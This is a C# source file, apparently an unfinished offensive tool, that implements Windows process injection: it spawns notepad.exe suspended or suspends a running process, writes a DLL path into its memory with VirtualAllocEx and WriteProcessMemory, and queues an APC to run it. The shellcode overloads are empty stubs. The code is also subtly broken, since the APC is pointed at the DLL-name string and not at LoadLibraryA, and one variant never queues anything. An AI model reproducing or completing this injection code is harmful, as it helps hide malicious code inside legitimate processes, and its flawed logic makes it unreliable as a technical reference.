using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ProcessInjection_Test1
{
    class sir_Injection_Class
    {
        // Suspend, Inject, Resume Specific Inports
        // These imports are specific to the SIR process
        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }
        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        // Process Structs
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // Memory Flags
        //
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // Used for memory allocation
        //
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_EXECUTE_READ = 0x20;

        // Imports
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandleess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);
        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr procHandleess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        // Suspend process and threads
        // https://stackoverflow.com/questions/71257/suspend-process-in-c-sharp
        public void suspend_Resume(Process proc, bool suspend)
        {
            foreach (ProcessThread pT in proc.Threads)
            {
                IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);

                if (pOpenThread == IntPtr.Zero)
                {
                    continue;
                }

                if (suspend)
                {
                    SuspendThread(pOpenThread);
                    CloseHandle(pOpenThread);
                }
                else
                {
                    var suspendCount = 0;
                    do
                    {
                        suspendCount = ResumeThread(pOpenThread);
                    } while (suspendCount > 0);
                }    
            }
        }


        // SuspendThread
        // OpenProcess (For DLL)
        // VirtualAllocEx
        // LoadLibraryA (For DLL)
        // WriteProcessMemory
        // PTHREAD_START_ROUTINE
        // QueueUserAPC
        // ResumeThread


        // Spawn a process, inject shellcode
        public void sir_Injection(byte[] sc)
        {

        }

        // Spawn a process, inject a DLL
        public void sir_Injection(string dllName)
        {
            // Create a suspended process
            string pPath = @"C:\Windows\notepad.exe";
            STARTUPINFO sI = new STARTUPINFO();
            PROCESS_INFORMATION pI = new PROCESS_INFORMATION();
            bool ret = CreateProcess(pPath, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref sI, out pI);

            //Get a handle to the newly created process
            IntPtr pHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, (int)pI.dwProcessId);
            //Allocate memory the size of DLL Name in process
            IntPtr vPtr = VirtualAllocEx(pI.hProcess, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            //Write the DLL into the allocated memory
            UIntPtr bytesWritten;
            byte[] bdll = System.Text.Encoding.Default.GetBytes(dllName);
            bool res = WriteProcessMemory(pHandle, vPtr, bdll, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

            //Get a handle to the newly created processes thread
            IntPtr oThread = OpenThread(ThreadAccess.SET_CONTEXT, false, pI.dwThreadId);

            //Set the proper permissions on the new memory region
            uint oldProtect = 0;
            res = VirtualProtectEx(pI.hProcess, vPtr, bdll.Length, PAGE_EXECUTE_READ, out oldProtect);
            
            //Give the address of the DLL to the APC Queue
            IntPtr nPtr = QueueUserAPC(vPtr, oThread, IntPtr.Zero);

            //Resume the process
            IntPtr ThreadHandle = pI.hThread;
            ResumeThread(ThreadHandle);
        }

        // Target a running process, inject shellcode
        public void sir_Injection(string processName, byte[] sc)
        {
            


        }

        // Target a running process, inject a DLL
        public void sir_Injection(string processName, string dllName)
        {


            Console.WriteLine("[+] Attempting to find " + processName);
            Process proc = Process.GetProcessesByName(processName)[0];

            // Suspend the process
            suspend_Resume(proc, true);

            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            IntPtr loadLibrary_Address = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");


            IntPtr vPtr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            UIntPtr bytesWritten;
            byte[] bdll = System.Text.Encoding.Default.GetBytes(dllName);
            bool res = WriteProcessMemory(procHandle, vPtr, bdll, (uint)bdll.Length, out bytesWritten);

            // ???
            foreach (ProcessThread pT in proc.Threads)
            {
                IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (uint)pT.Id);
                break;
            }

            uint oldProtect = 0;
            // Modify memory permissions on allocated shellcode
            res = VirtualProtectEx(procHandle, vPtr, bdll.Length, PAGE_EXECUTE_READ, out oldProtect);

            // Resume the process
            suspend_Resume(proc, false);

        }
    }
}
